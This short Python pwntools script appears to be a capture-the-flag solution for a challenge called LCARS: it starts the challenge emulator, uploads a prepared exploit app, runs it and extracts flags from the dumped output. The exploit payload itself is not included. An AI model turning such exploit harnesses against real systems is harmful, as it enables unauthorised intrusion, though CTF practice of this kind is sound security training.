from pwn import *
import hashlib

r = process(['./LCARS', './init.sys', './loader.sys', './echo.sys',
    './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp'])

def download(app):
    with open(app) as f:
        blob = f.read()
        r.sendline('download %s %d' % (app, len(blob)))
        r.send(blob)

r.sendline('run flag1.papp')
download('exp1.uapp')
r.sendline('run exp1.uapp')
print r.recvuntil('BEGIN\n')
d = r.recvuntil('END\n', drop=True)
flags = re.findall(r'OOO{.*}', d) # it appears multiple times
print flags
# open('dump', 'w').write(d)
# print hashlib.md5(d).hexdigest()

r.interactive()
